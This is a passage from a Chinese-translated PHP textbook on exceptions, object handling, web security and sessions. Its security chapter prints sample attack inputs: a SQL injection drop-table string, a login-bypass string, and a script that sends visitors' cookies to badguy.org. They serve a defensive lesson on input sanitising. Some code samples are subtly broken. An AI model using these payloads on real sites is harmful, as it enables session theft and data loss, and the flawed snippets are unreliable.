  \n### 抛出异常\n\n你可以在方法中使用以下语句抛出异常：\n\n```php\nthrow new Exception(\"message\");\n\
  ```\n\n该语句会创建一个 `Exception` 对象并在对象中存储一条消息。`Exception` 对象有一个 `getMessage` 方法，你可以用它来获取存储的消息。\n\
  \n在你的类定义中，你可以在方法中包含代码，以便在特定条件发生时创建 `Exception`。例如，下面 `Car` 类中的 `addGas` 方法按如下检查油量是否超过了汽车油箱的承载量：\n\
  \n```php\nclass Car\n{\n  private $gas = 0;\n  function addGas($amount)\n  {\n    $this->gas\
  \ = $this->gas + $amount;\n  echo \"<p>$amount gallons of gas were added</p>\";\n\
    if($this->gas > 50)\n  {\n     throw new Exception(\"Gas is overflowing\");\n\
     }\n  \n}\n```\n\n如果油箱中的油量超过 50 加仑，该方法就会抛出一个异常。油箱无法容纳那么多油。当你使用该类时，按如下方式测试异常：\n\
  \n```php\n$my_car = new Car();\ntry\n{\n  $my_car->addGas(10);\n  $my_car->addGas(45);\n\
  }\ncatch(Exception $e)\n{\n  echo $e->getMessage();\n  exit();\n}\n```\n\n前面的脚本包含一个\
  \ `try` 块和一个 `catch` 块：\n\n![check](img/check.png) `try`：在 `try` 块中，你包含任何你认为可能触发异常的语句。在这个脚本中，添加过多的油可能会触发异常，因此你在\
  \ `try` 块内部添加任何 `addGas` 方法调用。\n\n![check](img/check.png) `catch`：在 `catch` 块中，你捕获\
  \ `Exception` 对象并将其命名为 `$e`。然后你执行 `catch` 块中的语句。其中一条语句是调用 `Exception` 类中的 `getMessage`\
  \ 方法。`getMessage` 函数返回你存储的消息，你的语句会输出返回的消息。随后，语句会输出换行符，以便消息能正确显示。脚本在 `exit` 语句处停止。\n\
  \n如果没有抛出异常，`catch` 块就无物可捕获，它会被忽略。脚本将继续执行 `catch` 块之后的语句。在这种情况下，如果油量没有超过 50 加仑，`catch`\
  \ 块会被忽略，脚本将继续执行 `catch` 块之后的语句。\n\n如果你运行前面的脚本，浏览器将显示如下：\n\n```\n10 gallons of gas\
  \ were added\n45 gallons of gas were added\nGas is overflowing\n```\n\n第二次 `addGas`\
  \ 方法调用导致油量超过了 50 加仑，因此抛出了异常。`catch` 块显示了溢出消息并停止了脚本。\n\n## 复制对象\n\nPHP 提供了一个你可以使用的方法来复制对象。该方法是\
  \ `__clone`，开头有两个下划线。如果你想在对象被复制时运行特定的语句，可以在类中编写你自己的 `__clone` 方法。如果你不写，PHP 将使用其默认的\
  \ `__clone` 方法，按原复制所有属性。正如其名称开头的两个下划线所示，clone 方法是一种不同类型的方法，因此调用方式不同，如下例所示。\n\n你可以编写以下类：\n\
  \n```php\nclass Car\n{\n  private $gas = 0;\n  private $color = \"red\";\n  function\
  \ addGas($amount)\n  {\n    $this->gas = $this->gas + $amount;\n    echo \"$amount\
  \ gallons added to gas tank\";\n  }\n  function __clone()\n  {\n    $this->gas =\
  \ 5;\n  }\n \n}\n```\n\n使用这个类，你可以如下创建对象并复制它：\n\n```php\n$firstCar = new Car;\n$firstCar->addGas(10);\n\
  $secondCar = clone $firstCar;\n```\n\n在这些语句之后，你有两辆车：\n\n![check](img/check.png)\
  \ `$firstCar`：第一辆车有 10 加仑油。\n![check](img/check.png) `$secondCar`：第二辆车有 5 加仑油，因为调用了\
  \ `__clone` 方法。\n\n## 比较对象\n\n在简单的情况下，你可以使用相等运算符 (`==`) 或恒等运算符 (`===`) 来比较对象。相等运算符检查两个对象是否具有相同的属性和值，而恒等运算符检查它们是否实际上是同一个实例。\n\
  \n## 获取对象和类的信息\n\nPHP 提供了一些你可以使用的函数来获取有关对象和类的信息：\n\n![check](img/check.png) 你可以使用\
  \ `class_exists(\"classname\")` 检查类是否存在。\n\n![check](img/check.png) 你可以使用 `property_exists(\"\
  classname\", \"propertyname\")` 测试特定类中是否存在某个属性。\n\n![check](img/check.png) 你可以使用以下语句找到类中定义的属性（及其默认值）和方法：\n\
  \n```php\nget_class_vars(\"classname\");\nget_class_methods(\"classname\");\n```\n\
  \n![check](img/check.png) 你可以使用 PHP 5 添加的 `instanceof` 运算符如下所示测试一个对象、其父类或其实现的接口是否是由特定类创建的：\n\
  \n```php\nif($objectname instanceof \"classname\")\n```\n\n![check](img/check.png)\
  \ 你可以使用以下函数获取对象属性的当前值：\n\n```php\nget_object_vars($objectname);\n```\n\n## 销毁对象\n\
  \n你可以使用以下语句销毁对象：\n\n```php\nunset($objName);\n```\n\n例如，你可以使用以下语句创建并销毁 `Car` 类对象：\n\
  \n```php\n$myCar = new Car;\nunset($myCar);\n```\n\n在 `$myCar` 被 unset 后，该对象不再存在。PHP\
  \ 提供了一个在对象被销毁时自动运行的方法。你将此方法添加到类中并将其命名为 `__destruct`。例如，下面的类包含一个 `__destruct` 方法：\n\
  \n```php\nclass Bridge\n{\n  function __destruct()\n  {\n   echo \"The bridge is\
  \ destroyed\";\n  }\n}\n```\n\n如果你执行使用以下语句，对象将被创建并销毁：\n\n\n\n\n\n```php\n$bigBridge\
  \ = new Bridge;\nunset($bigBridge);\n```\n\n这些语句的输出是：\n\n`The bridge is destroyed`\n\
  \n当对象被 `unset` 时，`__destruct` 方法会输出该内容。\n\n`__destruct` 方法并不是必须的。它只是供你在需要在对象销毁时执行某些语句时使用。例如，你可能想要关闭某些文件或将某些信息复制到数据库中。\n\
  \n# 第 5 章：考虑 PHP 安全\n\n## 本章内容\n\n- 加固服务器和 Apache Web 服务器\n- 安全地配置 PHP\n- 安全地处理错误\n\
  - 变量清理\n\n作为一名 Web 开发人员，你需要确保你的 Web 应用程序是安全的。如果你还在服务器上承担管理职责，那么你还需要加固服务器。安全应用程序意味着确保来自用户的任何所有输入都经过了清理，或者根据你已知的良好值进行了检查，并且除非你通过程序检查了它们，否则不允许任何输入进入程序。安全服务器意味着尝试将\
  \ Web 应用程序限制在自己的虚拟沙箱中，这样即使服务器被入侵，损害也会被限制。\n\n本章将讨论 Web 应用程序的安全。你将同时关注服务器安全和应用程序安全。\n\
  \n## 加固服务器\n\n服务器本身应该被加固。这通常意味着加固服务器并确保服务器使用了防火墙。\n\n### 加固服务器\n\n通常这意味着通过卸载不必要的服务来加固操作系统。例如，通常没有理由在运行公共网站的同一服务器上运行打印服务器。\n\
  \n禁用和卸载不必要的服务可以减少服务器的攻击面，这意味着攻击者可以利用的东西就更少。\n\n`SELinux` 和 `grSecurity` 等工具也能增强服务器的安全性，并减少成功攻击者突破其自身小沙箱之外的能力。\n\
  \n### 使用防火墙\n\n无论是在服务器本身使用防火墙，还是在互联网与你的网络交叉点使用防火墙，或者两者兼顾，你都应该确保防火墙阻止指向特定允许端口之外的所有连接，例如对于典型\
  \ Web 服务器的 `TCP` 端口 `80` 和 `443`。\n\n更好的方案是在入口点（互联网与你的网络交叉点）和服务器本身都运行防火墙。这样做意味着即使攻击者找到了进入网络的其他方法，Web\
  \ 服务器也将受到保护。\n\n所有主流操作系统都包含了内置的防火墙工具，它们既易于设置又易于维护。\n\n## 加固 Apache\n\n加固 Apache\
  \ Web 服务器是一个相当广泛的话题，因此与其尝试将所有内容都挤进一个章节，我们专注于在 Apache 运行 PHP 应用程序时让 Apache 更安全的两种方法：使用\
  \ `SuExec` 和 `mod_security`。如果你使用第三方托管提供商，你将无法安装 `SuExec` 或 `mod_security`，而是将依赖托管提供商（并让他们担心）服务器安全。\n\
  \n### 使用 SuExec 加固 PHP 应用程序\n\n如果你的应用程序运行在 Apache 上（互联网上超过半数的网站都是这样运行），你可能想要考虑在你的\
  \ Apache 配置中启用 `SuExec`。`SuExec` 是 Apache 自带的一种机制，它导致脚本以脚本所有者的身份运行，而不是以 Web 服务器用户的身份运行。\n\
  \n在非 `SuExec` 环境中，所有脚本都与 Web 服务器本身相同的用户 ID 运行。不幸的是，一个存在漏洞的脚本就可以让恶意用户获得整个 Web 服务器的后门访问，包括运行在同一服务器托管的其他网站上的脚本。\n\
  \n`SuExec` 试图通过将 Web 应用程序限制在自己的区域内并并在所有者的用户 ID 下运行，而不是在 Web 服务器的用户 ID 下运行来缓解这个问题。例如，此脚本将在用户\
  \ `jsmith` 的 ID 下运行：\n\n`/home/~jsmith/public_html/scripts/please_hack_me.php`\n\
  \n恶意用户可以利用此脚本，但他或她将只能访问 `jsmith` 用户允许使用的文件和程序。服务器上的其他所有用户将受到 `jsmith` 不安全脚本的保护。\n\
  \n不幸的是，要让 `SuExec` 与虚拟主机（即物理上位于同一台 Web 服务器上的多个独立网站）正常工作可能是复杂的。`SuExec` 设计用于运行存在于\
  \ Web 服务器文档根目录下的脚本。大多数虚拟主机的设置方式是为每个单独的网站提供自己的文档根，而每个站的文档根并不位于 Web 服务器的文档根之下。为了规避这一限制，系统管理员必须在\
  \ Apache 配置文件中将每个虚拟主机的文档根添加到 Web 服务器的文档根变量中。\n\n`SuExec` 还要求 PHP 脚本必须以通用网关接口 (`CGI`)\
  \ 模式运行，这比在 Apache 下作为预编译模块运行 PHP 要慢。`CGI` 是 Web 应用程序的第一个可行模型，并且目前仍用于简单脚本。然而，一旦你离开\
  \ PHP 脚本领域并开始编写全功能应用程序，你将需要预编译 PHP 的性能提升。\n\n对于相当简单的 Web 服务器，`SuExec` 可以防止一个不安全的应用程序践及其他所有内容。然而，在具有虚拟服务器、预编译模块以及几十或数百个用户的更复杂的环境中，你需要一个更健壮的安全模型。`mod_security`（我们将在下一节中介绍）是\
  \ Web 服务器安全的一大飞跃，特别是对于运行虚拟服务器和预编译 PHP 的服务器。\n\n### mod_security\n\n`mod_security`\
  \ 是一个任何 Apache 服务器都不应不运行的开源模块。它是一个强大的过滤引擎，监控传入的请求（包括 `GET` 和 `POST`），并过滤掉那些可能导致问题的请求。将其想象成在你的服务器门口站着一个私人保镖。\n\
  \n`mod_security` 的工作原理是拦截指向你 Web 服务器的所有流量。它将流量与一组规则进行比较，以决定停止每个数据包还是允许其通过。默认情况下，`mod_security`\
  \ 自带一套保护服务器免受通用攻击的核心规则。你可以根据需要添加自己的规则来响应针对应用程序特定攻击。\n\n不幸的是，Apache 并不带 `mod_security`，所以你必须自己获取。幸运的是，它是开源的，可以从\
  \ `www.modsecurity.org` 获取。\n\n### 在 php.ini 中设置安全选项\n\n`php.ini` 文件有很多安全相关的选项。下表解释了每个选项的建议设置。\n\
  \n\n\n\n\n| `register_globals = off` | 如果启用此参数，所有环境、`GET`、`POST`、cookie 和服务器变量将被注册为全局变量，使得攻击者很容易获取。除非你别无选择启用它，否则你应该保持\
  \ `register_globals` 为关闭。 |\n| `display_errors = off` | 防止 PHP 错误和警告显示给用户。PHP 警告不仅会让你的网站看起来不专业，而且它们经常泄露敏感信息，例如路径名和\
  \ SQL 查询。 |\n| `log_errors = on` | 当启用此参数时，所有的警告和错误都将写入日志文件，你可以稍后检查这些警告和错误。 |\n\
  | `error_log = filename` | 指定 PHP 写入错误和警告的日志文件名称。 |\n\n## 安全地处理错误\n\n在理想的世界里，当你创建一个要求用户输入姓名的表单时，你可以合理地预期他们会输入像\
  \ John 或 Jane 这样的内容。遗憾的是，你也会遇到留空表单、输入地址或仅仅输入随机字符字符串的用户。而这些都是无害的用户。攻击者则出于不有用目的向你的表单中输入内容。请考虑以下关于坏家伙如何运作以及如何比他们领先一步的信息。\n\
  \n### 理解危险性\n\n攻击者使用不同的方法让你的网站面临风险。一种攻击类型被称为 SQL 注入。在这种攻击中，攻击者假设在表单中收集的信息将用于用于 SQL\
  \ 查询，并在你的数据库上执行。攻击者在你的表单字段中输入字符，这些字符在用于查询时会给你带来麻烦。\n\n例如，攻击者可能会输入类似 `John; drop%20table%20users`\
  \ 的内容。如果你的应用程序设置为将用户名输入数据库，你的 SQL 查询看起来可能会像这样：\n\n```\nINSERT INTO users VALUES\
  \ (John; drop table users);\n```\n\n取决于你的服务器配置，服务器可能会读取该查询并愉快地执行从你的数据库中删除 users\
  \ 表的操作。它可能会对语法稍有抱怨，但如果你的数据库配置比较松散，它将完全按照该行代码的指示执行：向 users 表中添加“John”，然后删除名为 users\
  \ 的表。这可不好。\n\n在 SQL 注入的另一个示例中，在表单的用户名字段中输入字符以绕过身份验证。假设用户在用户名字段中输入了以下字符：\n\n```\n\
  John' OR 'foo' = 'foo' --\n```\n\n你的脚本可能包含以下语句来测试用户名和密码：\n\n```\n$sql = \"SELECT\
  \ * FROM User WHERE userID = '$_POST[userID]'\"\n       AND password = '$_POST[password]'\"\
  ;\n```\n\n如果你在不更改代码的情况下直接插入用户输入的代码，你将得到以下 SQL 查询：\n\n```\n$sql = \"SELECT * FROM\
  \ User WHERE username = 'John' OR 'foo' = 'foo' -- ' AND password = '$_POST[password]'\"\
  ;\n```\n\n该查询允许用户在没有有效用户名或密码的情况下登录。在 `WHERE` 子句的第一个短语中，`foo = foo` 是真的。然后，`--` 将查询的剩余部分变为注释，在查询中实际上是不可见的。因此，此查询始终匹配某行。\n\
  \n另一种危险的表单输入是攻击者在你的表单字段中输入脚本。例如，攻击者可能会在表单字段中输入以下内容：\n\n```html\n<script>document.location='http://badguy.org/bad.php?cookies='\
  \ + document.cookie </script>\n```\n\n如果你存储了这段文本，然后将其发送给访问你网站的人，你的访问者会将与你的应用程序相关的\
  \ cookies 发送给坏家伙。另一个坏脚本可能是这样的：\n\n```php\n<script language=php eval(rm *); </script>\n\
  ```\n\n### 测试意外输入\n\n你对预期用户输入的数据可以做出几个相当准确的假设。例如，当你询问姓名时，你预期以下内容是正确的：\n\n- 数据是字母的——没有数字。\n\
  - 姓名可能包含空格、撇号或连字符，例如 Mary Jane、O’Hara 或 Anne-Marie。\n- 数据肯定不包含 HTML 标签或其他代码片段。\n\
  \n这些假设是测试意外输入的关键。使用正则表达式，将输入通过正则表达式进行处理。正则表达式（简称为 regex）是所有测试的核心。\n\n为了防止此类攻击——它通常被称为站点脚本攻击——对你任何计划渲染的值使用\
  \ `htmlentities()`，如此示例所示：\n\n```php\n$inputString = \"<b>Hello World</b>\";\n$safe_string\
  \ = htmlentities($inputString);\n```\n\n在这个示例中，`$safe_string` 将包含以下内容：\n\n```\n\
  &lt;b&gt;Hello World&lt;/b&gt;\n```\n\n### 处理意外情况\n\n大多数时候，你测试了用户的输入，它会顺利通过。但当出现问题时该怎么办？\n\
  \n处理意外输入的最简单方法是完全停止应用程序。然而，尽管这种方法会阻止坏数据进入你的应用程序，但也可能给仅仅误输信息的合法用户带来困惑和沮丧。\n\n因此，更好的解决方案是将用户返回输入界面并要求他或她重试。你可以让用户知道哪些字段引起了问题，让系统更加用户友好。如果你的测试捕到了类似于恶意活动的内容，你可能想要采取额外措施，例如写入日志文件、通知管理员，甚至阻塞产生违规输入的\
  \ IP 地址。\n\n### 检查所有表单数据\n\n检查表单中的所有信息，包括用户从列表、复选框或单选按钮选择的任何信息。这些字段也可能包含坏信息。\n\n\
  坏数据是如何从下拉列表或单选按钮发送的？很简单。有浏览器插件可以在点击提交按钮后更改 `GET` 和 `POST` 数据的值。因此，恶意人员可以简单地将任何值更改为他们想要的任何内容。\n\
  \n这一切的关键是将你预期的接收内容与实际收到的内容进行验证。你可以使用正则表达式检查你的列表变量。例如，以下正则表达式仅匹配指定的文本：\n\n```php\n\
  preg_match(\"/(male|female)/\")\n```\n\n\n\n\n\n有时候，当用户未能输入有效数据时，仅仅要求他们返回并重试并不是一个可行的方案。当你不得不使用用户提供的数据时，你可以使用一些技术来确保坏数据不会破坏你的应用程序——更糟糕的是，破坏支持你应用程序的底层系统，例如电子邮件传输和操作系统。接下来的章节将告诉你如何防止不良的用户输入搞乱运行。\n\
  \n## 转换 HTML 特殊字符\n\n有时候，你可能允许用户在你的应用程序中输入 HTML。例如，博客评论系统通常允许用户发布超链接。但你不需要让应用程序对用户可能想要输入的任何内容都完全开放。\n\
  \n如果你允许用户输入 HTML，你应该始终使用 `htmlentities()` 函数将 HTML 特殊字符转换为 HTML 实体。`htmlentities()`\
  \ 函数接受要转换的字符串作为参数。然后，该函数会对以下 HTML 特殊字符进行简单的查找和替换：\n\n- ![check](img/check.png) `&`（安培符号）变为\
  \ `&amp;`。\n- ![check](img/check.png) `\"`（双引号）变为 `&quot;`。\n- ![check](img/check.png)\
  \ `'`（单引号）变为 `&#039;`。\n- ![check](img/check.png) `<`（小于）变为 `&lt;`。\n- ![check](img/check.png)\
  \ `>`（大于）变为 `&gt;`。\n\n![tip.eps](img/tip_fmt.png) 如果你需要转义 HTML 中每一个特殊含义的字符，请使用\
  \ `htmlentities()` 而不是 `htmlspecialchars()`。有关 HTML 中具有特殊含义的字符，请参阅[`www.w3schools.com/html/html_entities.asp`](http://www.w3schools.com/html/html_entities.asp)。\n\
  \n## 在不损害文件系统的上上传文件\n\n大多数不需要上传文件。如果不允许上传文件，这些应用程序更安全。你可以通过 `php.ini` 文件中的 `file_uploads`\
  \ 设置来防止文件上传。该设置默认开启，如下所示：\n\n```\nfile_uploads = On\n```\n\n将设置更改为 `Off` 以防止 PHP\
  \ 脚本中的任何文件上传。\n\n某些应用程序需要让用户上传文件。遗憾的是，这一需求也带来了产生严重安全问题的可能性。恶意用户可以：\n\n- ![check](img/check.png)\
  \ 发起拒绝服务（DoS）攻击。\n- ![check](img/check.png) 覆盖现有文件。\n- ![check](img/check.png) 在服务器上放置恶意代码以供以后使用。\n\
  \n由于 Web 应用程序的开放性，你无法在应用程序内部完全保护文件上传功能，但你可以减轻危险。\n\n### 避免文件系统的 DoS 攻击\n\n文件上传创建了\
  \ DoS 攻击的可能性，因为恶意用户可以上传巨大的文件，并在过程中使用文件系统中所有的可用资源。上传大文件可以通过阻止服务器写入临时文件或虚拟内存交换文件来有效地导致服务器崩溃。你可以在\
  \ `php.ini` 中限制文件大小，但这样做并防止每秒尝试上传数百个 2MB 文件的脚本化攻击。\n\n你确实应该在 `php.ini` 中对文件大小设置限制。你还应该为上传的文件创建一个单独的文件系统。这个独立的系统可以将任何恶作剧行为与服务器的其他部分隔离开。上传文件系统可能会被垃圾文件填满，导致你的应用程序文件上传功能不可——但至少整个服务器不会崩溃。\n\
  \n### 验证文件\n\n文件被上传后，你应该验证它是否是一个合法文件。虽然你可能无法过滤掉每一个恶意上传，但你可以减少那些最明显的上传。这里是你可以验证文件的几种方法：\n\
  \n- ![check](img/check.png) 验证文件名扩展名。这种检查不是最稳健的测试（因为有人可以轻松重命名文件带有新扩展），但它操作简单，可以捕捉一些不复杂的破解者，他们尝试通过你的图像上传函数上传如\
  \ `spam_sender.php` 等文件。\n- ![check](img/check.png) 测试你预期的基本文件类型。例如，如果你期望的是图像，可以使用\
  \ `is_binary()` 函数过滤掉文本文件（如 PHP 脚本），如下所示：\n\n```\n$input = $_POST['input_file'];\n\
  \nif (is_binary($input)) {\n    // 正常处理\n}else {\n    // 拒绝文件，重定向浏览器，等。\n}\n```\n\
  \n- ![check](img/check.png) 使用 F-Prot 等杀毒程序对文件进行扫描（[`www.f-prot.com`](http://www.f-prot.com/)\
  \ 可用）。\n\n## 使用 FTP 函数确保安全上传文件\n\nWeb 应用程序出于各种原因允许用户上传文件是非常常见的。例如，某些留言板允许用户上传小图像或头像，显示在每个用户的每个帖子的旁边。其他应用程序允许你上传数据文件进行分析。你可以使用\
  \ PHP 内置的 `fopen()` 函数，它会自动打开一个指向文件或 URL 的流，从而允许用户上传文件。遗憾的是，这种方法很容易被恶意用户利用，他们可以使用它从远程服务器将文件上传到你的\
  \ Web 服务器上。\n\n防止这种利用的利用需要你在 `php.ini` 中禁用两个设置：`register_globals` 和 `url_fopen`。禁用这些设置可以防止用户在使用\
  \ PHP 内置的 `fopen()` 时需要上传文件。\n\n```php\n<?php\n// 设置连接\n$connection_id = ftp_connect($ftp_server);\n\
  \n// 使用用户名和密码登录\n$login_result = ftp_login($connection_id, $ftp_username, $ftp_password);\n\
  \n// 检查连接\nif (!$connection_id || (!$login_result)) {\n    echo \"FTP 连接失败！\";\n\
  \    exit;\n} else {\n    echo \"连接到 $ftp_server\";\n}\n\n// 上传文件\n$upload = ftp_put($connection_id,\
  \ $destination_file, $source_file, FTP_BINARY);\n\n// 检查上传状态\nif (!$upload) {\n\
  \    echo \"FTP 上传失败！\";\n} else {\n    echo \"已将 $source_file 上传到 $ftp_server 的\
  \ $destination_file\";\n}\n\n// 关闭 FTP 流\nftp_close($connection_id);\n?>\n```\n\n\
  这里是常用的 FTP 函数及其参数：\n\n- ![check](img/check.png) `ftp_connect(string $host [, int\
  \ $port [, int $timeout]])`: 连接到 FTP 服务器——在本例中为你的 Web 服务器。\n- ![check](img/check.png)\
  \ `ftp_login(resource $ftp_stream, string $username, string password)`: 向 FTP 服务器发送登录凭据。\n\
  - ![check](img/check.png) `ftp_put(resource $ftp_stream, string $remote_file, string\
  \ $local_file, int $mode [, int $startpos])`: 将本地文件放置到服务器。\n- ![check](img/check.png)\
  \ `ftp_get(resource $ftp_stream, string $local_file, string $remote_file, int $mode\
  \ [, int $resumepos])`: 从服务器获取文件并发送到本地机器。\n- ![check](img/check.png) `ftp_close(resource\
  \ $ftp_stream)`: 关闭与服务器的连接。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) 你需要在完成后尽快关闭\
  \ FTP 流；否则你将拥有一个易被劫持的开放连接。\n\n# 第 6 章：使用 Session 跟踪游客\n\n## 本章内容\n\n![arrow.png](img/arrow.png)\
  \ 理解 session 和 cookie\n\n\n\n\n\n![arrow.png](img/arrow.png) 使用会话 (Sessions)\n\n\
  本章将介绍 PHP 用于跨多个页面跟踪访问者的内置方法，称为“会话”（session）。本章首先介绍会话和 Cookie，然后直接进入正题，向你展示如何使用会话来跟踪访问者。\n\
  \n# 理解会话和 Cookie\n\n你无疑见过那些能够识别你身份的网站，它们可能会在你登录后欢迎你，或者在登录后向你展示有关你账户的自定义信息。实现这一点的有几种方法，包括在每次请求通过表单发送数据。但这样做并不安全，对于如今的\
  \ Web 应用程序来说不够灵活。幸运的是，有一种更好的方法——它就在你的指尖：会话。\n\n## 查看会话\n\nPHP 会话是一种从一个页面到另一个页面跟踪用户的安全方式。通过会话，你可以存储用户的信息，例如他们的电子邮件地址、姓名、电话号码以及你拥有的任何其他细节，并在网站任何需要的地方自动填充这些信息。例如，假设在登录时从用户数据库中加载了用户的名字和电子邮件地址。你可以将这些信息存储在会话中，本质上对用户隐藏，直到你使用它们为止。\n\
  \n你可以像使用其他变量一样使用会话变量。在后台，会话存储在一个名为 `$_SESSION` 的数组中。你存储值的方式就像在 PHP 中使用具名数组一样。例如，你可以像这样跟踪电子邮件地址和姓名：\n\
  \n```php\n$_SESSION['emailAddress'] = \"me@example.com\";\n$_SESSION['firstName']\
  \ = \"Steve\";\n```\n\n你还可以使用会话来跟踪 Web 表单中填写的信息，而无需通过隐藏的表单变量在站点中携带这些信息。\n\n## 使用\
  \ Cookie\n\n会话通过浏览器 Cookie 传递，Cookie 是在 Web 浏览器进出发送的少量额外信息。实际的信息位（或者这些信息位究竟是什么）取决于你这个程序员。例如，你可以发送一个包含用户姓名的\
  \ Cookie。该 Cookie 可以存储在用户的计算机上，当她下次访问网站时，Cookie 就会发送到你的程序，你的程序随后会展示个性化的问候。\n\n然而，Cookie\
  \ 与从用户那里获取的任何数据一样——来自 Cookie 的数据需要经过清理（正如我们在上一节中讨论的那样），因为它们是不可的。换句话说，一旦你的程序向访问者的浏览器发送了\
  \ Cookie，访问者就可以编辑或更改该 Cookie 为他想要的任何内容。所以，如果你（Web 开发者）使用 Cookie 来存储用户名，访问者可以将用户名更改为他想要的任何内容，然后发送回你的程序。\n\
  \n用户编辑 Cookie 的可能性在很大程度上通过简单使用会话得到了解决。当会话 Cookie 被创建时，它使用一个哈希值，这是一个长字符字符串。这意味着即使用户更改了\
  \ Cookie 值（换句话说，如果他们更改了哈希值），他们并没有真正改变你在程序中直接使用的任何内容。\n\n相反，PHP 会代表你处理来自 Cookie 的哈希转换，然后你就可以像之前解释的那样继续使用\
  \ `$_SESSION` 数组中的内容。你存储在 `$_SESSION` 数组中的实际值用户是永远看不见的；它们只存在于服务器上。当然，使用会话配合 Cookie\
  \ 意味着需要在用户的浏览器中启用 Cookie。如果没有启用，用户将无法使用应用程序。\n\n## 检查是否已启用 Cookie\n\n你使用 PHP 中的\
  \ `setcookie()` 函数在浏览器中设置 Cookie。然后如果你的程序可以读取该 Cookie，你就知道 Cookie 已启用。`setcookie()`\
  \ 函数接受多个参数来定义 Cookie 的行为。例如，你可以设置 Cookie 的名称，但也可以设置 Cookie 的有效时间以及它是否会在安全连接上使用，以及其他几个选项。\n\
  \n对于我们的目的来说，我们只需设置 Cookie 的名称和值。你可以按照以下步骤检查你的浏览器中是否启用了 Cookie：\n\n1. 打开你的文本编辑器并创建一个新的空文件。\n\
  2. 在文件中输入以下代码：\n\n```php\n<?php\nif (isset($_GET['cookiecheck'])) {\n    if (isset($_COOKIE['testcookie']))\
  \ {\n        print \"Cookies are enabled\";\n    } else {\n        print \"Cookies\
  \ are not enabled\";\n    }\n} else {\n    setcookie('testcookie', \"testvalue\"\
  );\n    die(header(\"Location: \" . $_SERVER['PHP_SELF'] . \"?cookiecheck=1\"));\n\
  }\n?>\n```\n\n3. 将文件保存为 `cookie.php` 并放在你的文档根目录下。\n4. 将你的 浏览器指向 `http://localhost/cookie.php`，你将看到一个类似于图\
  \ 6-1 所示的页面。\n\n![9781118213704-fg04061.eps](img/9781118213704-fg04061.png)\n**图\
  \ 6-1:** 检查是否已启用 Cookie。\n\n如果你的浏览器中没有启用 Cookie，你将看到类似图 6-2 所示的页面。\n\n![9781118213704-fg04062.eps](img/9781118213704-fg04062.png)\n\
  **图 6-2:** 显示未启用 Cookie。\n\n注意：如果你想在禁用 Cookie 的情况下测试，可以这样做。\n\n# 使用会话传递数据\n\n在 Cookie\
  \ 启用的情况下（大多数浏览器中都是如此），你可以开始使用会话在应用程序的页面之间传递数据。\n\n## 会话\n\n使用会话的关键是 `session_start()`\
  \ 函数。你在每个页面上调用 `session_start()`，随后就可以访问 `$_SESSION` 数组中的所有项。\n\n`session_start()`\
  \ 这个名字似乎有点奇怪，因为在大多数页面上，你只是想继续会话并访问那里的变量。但实际上，`session_start()` 兼顾两件事：在需要时启动新会话，在适当的情况下继续现有会话。\n\
  \n`session_start()` 函数的调用方式如下：\n\n```php\n<?php\nsession_start();\n// 其他 PHP 语句\n\
  ?>\n```\n\n这里是几个跟踪你访问应用程序第一个页面的代码。这展示了 `session_start()` 函数的使用，以及用于保存初始访问时间的变量。`page1.php`\
  \ 显示了第一个页的代码。\n\n### 列表 6-1: 创建会话变量\n\n```php\n<?php\nsession_start();\n$_SESSION['accessTime']\
  \ = date(\"M/d/Y g:i:sa\");\nprint \"这是第 1 页<br />\";\nprint \"你访问应用程序的时间: \" .\
  \ $_SESSION['accessTime'];\nprint \"<div><a href=\\\"page2.php\\\">继续到下一页</a></div>\"\
  ;\n?>\n```\n\n在浏览器中查看时，该页面看起来像图 6-3。\n\n![9781118213704-fg04063.eps](img/9781118213704-fg04063.png)\n\
  **图 6-3:** 访问应用程序的第一个页。\n\n应用程序中的下一个页面随后启动会话，并访问已在会话中设置的任何变量。`page2.php` 显示了第二页的代码。\n\
  \n### 列表 6-2: 第二页访问会话变量\n\n```php\n<?php\nsession_start();\nprint \"这是第 2 页<br />\"\
  ;\n?>\n```\n\n\n\n\n\n```php\nprint \"You accessed the application at: \" . $_SESSION['accessTime'];\n\
  print \"<div><a href=\\\"page3.php\\\">Continue to next page</a></div>\";\n?>\n\
  ```\n\n注意 Listing 6-2 中的代码，变量 `$_SESSION['accessTime']` 并没有被再次设置，而是在 session 启动后仅被访问了。当你位于\
  \ `page1.php` 上并点击链接进入下一页时，你会得到一个类似图 6-4 所示的页面。\n\n![9781118213704-fg040604.eps](img/9781118213704-fg040604_fmt.png)\n\
  \n**图 6-4：** 访问应用程序的第二个页面。\n\n你可以在 session 中存储几乎任何内容，但你应该意识到，session 会因为各种原因消失，而且有时确实会。session\
  \ 消失的原因之一是超时。如果用户在页面上停留时间过长，当他们再次使用应用程序时，session 可能已经不存在。\n\n在第七部分中，你会看到如何更改 session\
  \ 超时值。然而，即使更改了 session 超时时间，session 仍然可能消失。例如，如果用户在 session 期间清除了 cookie，那么 session\
  \ cookie 就会消失并启动一个新的。\n\nsession 消失的实际影响是，你之前设置的任何变量也会随消失。因此，在使用这些值之前，检查 session\
  \ 是否包含你预期的值是一个良好的习惯。有几种方法可以实现。一种方法是在访问所有变量之前进行检查。例如，你可以修改 Listing 6-2，在输出中使用它之前先检查\
  \ `$_SESSION['accessTime']` 变量。Listing 6-3 展示了那样的样子。\n\n### Listing 6-3：在使用 Session\
  \ 变量之前检查其已设置\n\n```php\n<?php\nsession_start();\nif (!isset($_SESSION['accessTime']))\
  \ {\n    die(header(\"Location: page1.php\"));\n}\nprint \"This is page 2<br />\"\
  ;\nprint \"You accessed the application at: \" . $_SESSION['accessTime'];\nprint\
  \ \"<div><a href=\\\"page3.php\\\">Continue to next page</a></div>\";\n?>\n```\n\
  \nListing 6-3 添加了以下代码：\n\n```php\nif (!isset($_SESSION['accessTime'])) {\n    die(header(\"\
  Location: page1.php\"));\n}\n```\n\n![remember](img/remember_fmt.png) 该代码的位置至关重要。因为该代码需要发送\
  \ HTTP 头部，所以它必须出现在任何输出之前。例如，如果该代码出现在 \"This is page 2\" 输出之后，它将无法作用，因为头部已经发送了。该代码出现在任何输出之前，同时也出现在\
  \ `session_start()` 函数之后。\n\n最佳实践是如上所示，在使用 session 变量之前检查它们是否存在。然而，在大型应用程序中检查你可能用到的所有变量可能会非常繁琐。考虑到这一点，另一个选项是设置一个全局变量并检查其是否存在，而不是逐一检查。以下是做法。\n\
  \nListing 6-4 显示了 Listing 6-1 `page1.php` 的更新版本。在这段代码中，有一个新增：名为 `appStarted` 的新\
  \ session。\n\n### Listing 6-4：为 Session 添加全局变量\n\n```php\n<?php\nsession_start();\n\
